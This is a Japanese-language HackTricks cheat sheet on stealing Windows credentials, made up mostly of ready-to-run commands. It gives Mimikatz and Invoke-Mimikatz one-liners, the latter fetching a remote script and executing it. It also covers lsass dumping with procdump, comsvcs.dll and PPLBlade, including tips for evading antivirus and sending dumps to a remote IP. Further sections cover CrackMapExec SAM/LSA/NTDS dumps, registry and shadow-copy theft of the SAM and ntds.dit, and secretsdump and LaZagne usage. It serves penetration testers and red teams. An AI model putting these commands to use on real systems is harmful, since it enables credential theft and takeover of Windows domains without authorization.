# Windows資格情報の盗難

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}

## 資格情報Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatzができる他のことを** [**このページ**](credentials-mimikatz.md)**で見つけてください。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**ここでいくつかの可能な資格情報保護について学びましょう。**](credentials-protections.md) **この保護は、Mimikatzが一部の資格情報を抽出するのを防ぐことができます。**

## Meterpreterによる資格情報

私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用して、** 被害者の内部で **パスワードとハッシュを検索します。**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AVをバイパスする

### Procdump + Mimikatz

**SysInternalsのProcdumpは** [**Microsoftの正当なツール**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**であるため、Defenderに検出されません。**\
このツールを使用して、**lsassプロセスをダンプし、**ダンプをダウンロードし、**ダンプから**資格情報をローカルに抽出**できます。

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="ダンプから資格情報を抽出する" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

このプロセスは自動的に[SprayKatz](https://github.com/aas-n/spraykatz)を使用して行われます：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：一部の**AV**は**procdump.exeを使用してlsass.exeをダンプする**ことを**悪意のある**ものとして**検出**する場合があります。これは、**"procdump.exe"と"lsass.exe"**という文字列を**検出**しているためです。したがって、**lsass.exeの名前の代わりに**lsass.exeの**PID**をprocdumpに**引数**として渡す方が**隠密**です。

### **comsvcs.dll**を使用したlsassのダンプ

`C:\Windows\System32`にある**comsvcs.dll**というDLLは、クラッシュが発生した場合に**プロセスメモリをダンプする**役割を担っています。このDLLには、`rundll32.exe`を使用して呼び出すように設計された**`MiniDumpW`**という**関数**が含まれています。\
最初の2つの引数を使用することは無関係ですが、3つ目の引数は3つのコンポーネントに分かれています。ダンプされるプロセスIDが最初のコンポーネントを構成し、ダンプファイルの場所が2番目を表し、3番目のコンポーネントは厳密に**full**という単語です。代替オプションは存在しません。\
これら3つのコンポーネントを解析すると、DLLはダンプファイルを作成し、指定されたプロセスのメモリをこのファイルに転送します。\
**comsvcs.dll**を利用することで、lsassプロセスをダンプすることが可能であり、procdumpをアップロードして実行する必要がなくなります。この方法の詳細は[https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)に記載されています。

実行に使用されるコマンドは次のとおりです：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **タスクマネージャーを使用してlsassをダンプする**

1. タスクバーを右クリックし、タスクマネージャーをクリックします
2. 詳細をもっとクリックします
3. プロセスタブで「Local Security Authority Process」プロセスを検索します
4. 「Local Security Authority Process」プロセスを右クリックし、「ダンプファイルの作成」をクリックします。

### procdumpを使用してlsassをダンプする

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートの一部であるMicrosoft署名のバイナリです。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、メモリダンプを難読化し、ディスクに保存することなくリモートワークステーションに転送することをサポートする保護プロセスダンプツールです。

**主な機能**:

1. PPL保護のバイパス
2. Defenderの署名ベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
3. ディスクに保存することなくRAWおよびSMBアップロードメソッドでメモリダンプをアップロードする（ファイルレスダンプ）

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### SAMハッシュをダンプする
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSAシークレットのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### ターゲットDCからNTDS.ditをダンプする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### ターゲットDCからNTDS.ditパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### NTDS.dit アカウントごとの pwdLastSet 属性を表示する
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEMの盗難

このファイルは**_C:\windows\system32\config\SAM_**と**_C:\windows\system32\config\SYSTEM._**に**存在するべきです**。しかし、**通常の方法でコピーすることはできません**。なぜなら、それらは保護されているからです。

### レジストリから

これらのファイルを盗む最も簡単な方法は、レジストリからコピーを取得することです：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**ダウンロード** これらのファイルをあなたのKaliマシンに保存し、**ハッシュを抽出**するには:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### ボリュームシャドウコピー

このサービスを使用して保護されたファイルのコピーを実行できます。管理者である必要があります。

#### vssadminの使用

vssadminバイナリはWindows Serverバージョンでのみ利用可能です。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、**Powershell**からも同じことができます。これは**SAMファイルをコピーする方法**の例です（使用されるハードドライブは"C:"で、C:\users\Publicに保存されます）が、これは保護されたファイルをコピーするために使用できます：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

最後に、[**PSスクリプト Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使用して、SAM、SYSTEM、およびntds.ditのコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directoryの資格情報 - NTDS.dit**

**NTDS.dit**ファイルは**Active Directory**の中心として知られ、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ここにはドメインユーザーの**パスワードハッシュ**が保存されています。このファイルは**Extensible Storage Engine (ESE)**データベースであり、**_%SystemRoom%/NTDS/ntds.dit_**に存在します。

このデータベース内には、3つの主要なテーブルが維持されています：

- **データテーブル**: このテーブルは、ユーザーやグループなどのオブジェクトに関する詳細を保存する役割を担っています。
- **リンクテーブル**: グループメンバーシップなどの関係を追跡します。
- **SDテーブル**: 各オブジェクトの**セキュリティ記述子**がここに保持され、保存されたオブジェクトのセキュリティとアクセス制御を確保します。

これに関する詳細情報: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windowsは_Ntdsa.dll_を使用してそのファイルと対話し、_lsass.exe_によって使用されます。次に、**NTDS.dit**ファイルの**一部**は**`lsass`**メモリ内に存在する可能性があります（**キャッシュ**を使用することによるパフォーマンス向上のために、最新のアクセスデータを見つけることができるかもしれません）。

#### NTDS.dit内のハッシュの復号化

ハッシュは3回暗号化されています：

1. **BOOTKEY**と**RC4**を使用してパスワード暗号化キー（**PEK**）を復号化します。
2. **PEK**と**RC4**を使用して**ハッシュ**を復号化します。
3. **DES**を使用して**ハッシュ**を復号化します。

**PEK**は**すべてのドメインコントローラー**で**同じ値**を持っていますが、**NTDS.dit**ファイル内ではドメインコントローラーの**SYSTEMファイルのBOOTKEY**を使用して**暗号化**されています（ドメインコントローラー間で異なります）。これが、NTDS.ditファイルから資格情報を取得するために**NTDS.ditとSYSTEMファイルが必要な理由**です（_C:\Windows\System32\config\SYSTEM_）。

### Ntdsutilを使用したNTDS.ditのコピー

Windows Server 2008以降で利用可能です。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
You could also use the [**ボリュームシャドウコピー**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**レジストリからダンプするかボリュームシャドウコピー**](./#stealing-sam-and-system) trick).

### **NTDS.ditからハッシュを抽出する**

Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
あなたは有効なドメイン管理者ユーザーを使用して、**自動的に抽出することもできます**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**大きな NTDS.dit ファイル**の場合、[gosecretsdump](https://github.com/c-sto/gosecretsdump)を使用して抽出することをお勧めします。

最後に、**metasploit モジュール**: _post/windows/gather/credentials/domain\_hashdump_ または **mimikatz** `lsadump::lsa /inject` を使用することもできます。

### **NTDS.dit から SQLite データベースへのドメインオブジェクトの抽出**

NTDS オブジェクトは、[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)を使用して SQLite データベースに抽出できます。秘密だけでなく、取得した生の NTDS.dit ファイルからさらに情報を抽出するために、オブジェクト全体とその属性も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` ハイブはオプションですが、秘密の復号化を可能にします（NTおよびLMハッシュ、平文パスワード、Kerberosまたは信頼キー、NTおよびLMパスワード履歴などの補足資格情報）。他の情報とともに、以下のデータが抽出されます：ハッシュを持つユーザーおよびマシンアカウント、UACフラグ、最終ログオンおよびパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループおよび再帰的メンバーシップ、組織単位ツリーおよびメンバーシップ、信頼されたドメインと信頼の種類、方向および属性...

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)からバイナリをダウンロードしてください。このバイナリを使用して、いくつかのソフトウェアから資格情報を抽出できます。
```
lazagne.exe all
```
## SAMおよびLSASSからの資格情報抽出のための他のツール

### Windows Credentials Editor (WCE)

このツールはメモリから資格情報を抽出するために使用できます。ダウンロードはこちらから: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAMファイルから資格情報を抽出します。
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAMファイルから資格情報を抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

ダウンロードはこちらから: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) そして **実行するだけで** パスワードが抽出されます。

## 防御

[**ここでいくつかの資格情報保護について学びましょう。**](credentials-protections.md)

{% hint style="success" %}
AWSハッキングを学び、実践する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**テレグラムグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
